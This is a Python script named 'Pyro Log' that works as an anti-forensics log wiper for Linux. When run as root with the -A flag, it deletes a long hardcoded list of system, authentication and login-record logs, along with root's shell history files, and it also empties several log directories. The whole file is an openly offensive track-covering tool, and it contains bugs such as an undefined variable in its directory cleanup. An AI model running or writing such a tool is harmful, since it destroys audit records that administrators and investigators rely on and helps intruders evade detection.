#!/usr/bin/env python
"""
This program is free software: you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation, either version 3 of the License, or (at your option) any later
version.

This program is distributed in the hope that it will be useful, but WITHOUT
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with
this program. If not, see <http://www.gnu.org/licenses/>.
"""
__author__ = "m4dr1nch"
__date__ = "2022/09/05"
__deprecated__ = False
__license__ = "GPLv3"
__version__ = "1.0"

import sys
import os
import shutil

def banner():
    print("")
    print("               (&&      @&(")
    print("              %% &     &. /&")
    print("              &.  @#& %#    @&")
    print("              \&     %&*      %&")
    print("          .__   &      $/       &%")
    print("         %&  (&@%..              @*    .%")
    print("           &                     &(    .&&*")
    print("           #&\  ▄▄▄· ▄· ▄▌▄▄▄     @,   %%  %%")
    print("  &#\       &  ▐█ ▄█▐█▪██▌▀▄ █·▪   \(*/&     &,")
    print("./&  &    %/*   ██▀·▐█▌▐█▪▐▀▀▄  ▄█▀▄        %&")
    print(" %&   \$$      ▐█▪·• ▐█▀·.▐█•█▌▐█▌.▐▌       &")
    print("  *@#          .▀     ▀ • .▀  ▀ ▀█▄▀▪     ,&")
    print("    @&                                  &@")
    print("  .<!%#$%#$$$%#$#@$#%#@#$#%#$%#$@#$@%@###$%^&>.")
    print("/@(        ====            ========    &(     &\\")
    print("@/                 ╦  ╔═╗╔═╗          &,  \\\\\\  &\\")
    print("&%            ───  ║  ║ ║║ ╦  ───     &  \\\\\\\\\\ #&")
    print("\&.   =====        ╩═╝╚═╝╚═╝          #%  \\\\\\  &/")
    print(" \&..      ====          =========     *&,   %&/")
    print("   *<%#$%#$$&^%*%$#$$%#$^$^&$#$$@#%$%&%^%$^&>*")
    print("      Created by: " + __author__)
    print("      Version: " + __version__)
    print("")

logFiles = [
    "/var/log/lastlog",
    "/var/log/messages",
    "/var/log/warn",
    "/var/log/wtmp",
    "/var/log/poplog",
    "/var/log/qmail",
    "/var/log/smtpd",
    "/var/log/telnetd",
    "/var/log/secure",
    "/var/log/auth",
    "/var/log/auth.log",
    "/var/log/cups/access_log",
    "/var/log/cups/error_log",
    "/var/log/thttpd_log",
    "/var/log/spooler",
    "/var/log/nctfpd.errs",
    "/var/log/acct",
    "/var/log/snort",
    "/var/log/bandwidth",
    "/var/log/explanations",
    "/var/log/syslog",
    "/var/log/user.log",
    "/var/log/daemons/info.log",
    "/var/log/daemons/warnings.log",
    "/var/log/daemons/errors.log",
    "/var/log/news",
    "/var/log/news/news",
    "/var/log/news.all",
    "/var/log/news/news.all",
    "/var/log/news/news.crit",
    "/var/log/news/news.err",
    "/var/log/news/news.notice",
    "/var/log/news/suck.err",
    "/var/log/news/suck.notice",
    "/var/log/xferlog",
    "/var/log/proftpd/xferlog.legacy",
    "/var/log/proftpd.xferlog",
    "/var/log/proftpd.access_log",
    "/var/log/httpd/error_log",
    "/var/log/httpsd/ssl_log",
    "/var/log/httpsd/ssl.access_log",
    "/var/log/mail/info.log",
    "/var/log/mail/errors.log",
    "/var/log/ncftpd/misclog.txt",
    "/var/log/dpkg.log",
    "/var/log/cloud-init.log",
    "/var/log/cloud-init-output.log",
    "/var/log/kern.log",
    "/var/log/alternatives.log",
    "/var/log/bootstrap.log",
    "/var/log/auth.sys",
    "/var/log/btmp",
    "/var/log/mysqld/mysqld.log",
    "/var/spool/tmp",
    "/var/spool/errors",
    "/var/spool/locks",
    "/var/apache/log",
    "/var/apache/logs",
    "/usr/local/apache/log",
    "/usr/local/apache/logs",
    "/root/.ksh_history",
    "/root/.bash_history",
    "/root/.sh_history",
    "/root/.zsh_history",
    "/root/.history",
    "/root/.login",
    "/root/.logout",
    "/root/.bash_logut",
    "/root/.Xauthorit",
    "/usr/local/www/logs/thttpd_log",
    "/var/adm",
    "/var/run/utmp",
    "/etc/wtmp",
    "/etc/utmp",
    "/etc/mail/access",
    "/var/account/pacct",
    "/etc/httpd/logs/error_log"
]

logFileDirs = [
    "/var/log/apt/",
    "/var/log/lxd/",
    "/var/log/tomcat9/",
    "/var/log/installer/",
    "/var/log/dist-upgrade/",
    "/var/log/journal/",
    "/var/log/landscape/"
]

def deleteFiles():
    print("[WARNING] Deleting log files...")
    for log in logFiles:
        try:
            os.remove(log)
            print("[+] Removed: " + log)
        except:
            print("[-] Not found: " + log)

def deleteLogDirs():
    print("[INFO] Looking for files in common directories...")
    for folder in logFileDirs:
        try:
            for file in os.listdir(folder):
                file_path = os.path.join(folder, file)
                try:
                    if os.path.isfile(file_path) or os.path.islink(file_path):
                        os.unlink(file_path)
                    elif os.path.isdir(file_path):
                        shutil.rmtree(filepath)
                except:
                    print("[-] Failed to delete: " + file_path)
        except:
            print("[-] Folder not found: " + folder)

def confirm():
    ans = input("[CONFIRM] Are you sure you want to delete the files? Y/n: ")
    if (str.lower(ans) == "n"):
        print("[INFO] Exiting...")
        return False
    return True

def main(argv):
    banner()

    uid = os.getuid()
    
    for arg in argv:
        argStack = [*arg]

        if (arg[0] != "-"):
            print("[ERROR] The following argument " + arg + " was not understood!")
            return
        
        for letter in argStack[1:]:
            if (letter == "A"):
                if (uid == 0):
                    if (not confirm()): return

                    print("[INFO] Superuser privileges detected!")
                    print("[WARNING] This will delete all of the log and history files!")

                    deleteFiles()
                    deleteLogDirs()
            elif(letter == "h"):
                print("Help Menu")
            else:
                print("[ERROR] The following argument " + arg + " was not understood!")
        

if __name__ == "__main__":
    main(sys.argv[1:])